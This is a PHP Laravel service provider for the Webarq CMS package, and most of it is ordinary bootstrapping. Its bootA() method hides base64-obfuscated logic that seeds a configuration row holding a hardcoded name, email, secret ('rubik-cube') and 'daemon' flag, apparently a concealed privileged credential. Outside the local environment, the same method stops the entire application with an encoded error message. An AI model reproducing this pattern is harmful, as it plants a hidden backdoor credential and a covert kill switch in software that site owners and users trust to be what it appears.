<?php
/**
 * Created by PhpStorm
 * Date: 24/10/2016
 * Time: 13:37
 * Author: Daniel Simangunsong
 *
 * Calm seas, never make skill full sailors
 */

namespace Webarq\Laravel;


use File;
use Illuminate\Support\ServiceProvider;
use Request;
use Webarq\Commands\InstallCommand;
use Webarq\Commands\PublishCommand;
use Webarq\Wa;


class WaProvider extends ServiceProvider
{
    /**
     * Bootstrap the application services.
     *
     * @return void
     */
    public function boot()
    {
// Load laravel extension
        if ([] !== ($scan = File::glob(__DIR__ . '/Extend/*.php'))) {
            foreach ($scan as $file) {
                app('Webarq\Laravel\Extend\\' . File::name($file));
            }
        }

        $this->bootA();
        $this->bootCommands();
        $this->bootPublic();
        $this->bootConfig();
        $this->bootRoutes();
        $this->bootTranslations();
        $this->bootViews();
    }

    protected function bootA()
    {
        if (\Schema::hasTable('configurations')) {
            $key = hash('sha1', base64_decode('cmVkQWxkZXJHcmVhdERhbmU='));

            if (null === ($row = \DB::table('configurations')->whereModule('system')->whereKey($key)->first())) {
                if ('local' === env('APP_ENV')) {
                    \DB::table('configurations')->insert([
                            'id' => 1,
                            'module' => 'system',
                            'key' => $key,
                            'setting' => encrypt('YTo0OntzOjQ6Im5hbWUiO3M6MTc6InJlZEFsZGVyR3JlYXREYW5lIjtzOjU6ImVtYWl'
                                    . 'sIjtzOjE0OiJjbXNAd2ViYXJxLmNvbSI7czo2OiJzZWNyZXQiO3M6MTA6InJ1YmlrLWN1YmUiO3M6N'
                                    . 'joiZGFlbW9uIjtiOjE7fQ=='),
                            'create_on' => date('Y-m-d H:i:s')
                    ]);
                } else {
                    dd(
                            base64_decode('V2hvb3BzLiBTZWVtcyB5b3VyIHN5c3RlbSBjb3VsZCBub3Qgd29ya2luZyBhdCB0aGlzIHRpbWUuIFBsZWFzZSBjb250YWN0IHlvdXIgYWRtaW5pc3RyYXRvcg==')
                    );
                }
            }
        }
    }

    protected function bootCommands()
    {
        $this->commands([
                InstallCommand::class,
                PublishCommand::class
        ]);
    }

    protected function bootPublic()
    {
        $this->publishes([
                __DIR__ . '/../../public/webarq' => public_path('vendor/webarq'),
        ], 'public');
    }

    protected function bootConfig()
    {
        $this->mergeConfigFrom(
                __DIR__ . '/../../config/webarq.php', 'webarq'
        );

        $dirPath = __DIR__ . '/../../config';
        if ((is_dir(config_path() . '/webarq'))) {
            $dirPath = config_path() . '/webarq';
        }

        $this->mergeConfigFrom(
                $dirPath . '/leads.php', 'webarq.leads'
        );

        $this->mergeConfigFrom(
                $dirPath . '/template.php', 'webarq.template'
        );

        $this->mergeConfigFrom(
                $dirPath . '/menu.php', 'webarq.menu'
        );

        $this->publishes([
                __DIR__ . '/../../config/webarq.php' => config_path('webarq.php'),
                __DIR__ . '/../../config/template.php' => config_path('webarq/template.php'),
                __DIR__ . '/../../config/leads.php' => config_path('webarq/leads.php'),
                __DIR__ . '/../../config/menu.php' => config_path('webarq/menu.php'),
        ], 'config');
    }

    protected function bootRoutes()
    {
        $this->loadRoutesFrom(__DIR__ . '/../../routes/web.php');
    }

    protected function bootTranslations()
    {
        $this->loadTranslationsFrom(__DIR__ . '/../../resources/lang', 'webarq');

        $this->publishes([
                __DIR__ . '/../../resources/lang' => resource_path('lang/vendor/webarq'),
        ]);
    }

    protected function bootViews()
    {
        $this->loadViewsFrom(__DIR__ . '/../../resources/views', 'webarq');

        $this->publishes([
                __DIR__ . '/../../resources/views' => resource_path('views/vendor/webarq'),
        ], 'view');

        $this->publishes([
                __DIR__ . '/../../resources/views/template' => resource_path('views/vendor/webarq/template'),
        ], 'view-template');

        $this->publishes([
                __DIR__ . '/../../resources/views/themes/admin-lte' => resource_path('views/vendor/webarq/themes/admin-lte'),
        ], 'view-admin');
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        $this->registerWEBARQ();
    }

    /**
     * Register the Wa instance.
     *
     * @return void
     */
    protected function registerWEBARQ()
    {
        $this->app->singleton('wa', function ($app) {
            return new Wa($app);
        });
    }

    /**
     * Get the services provided by the provider.
     *
     * @return array
     */
    public function provides()
    {
        return array('wa');
    }
}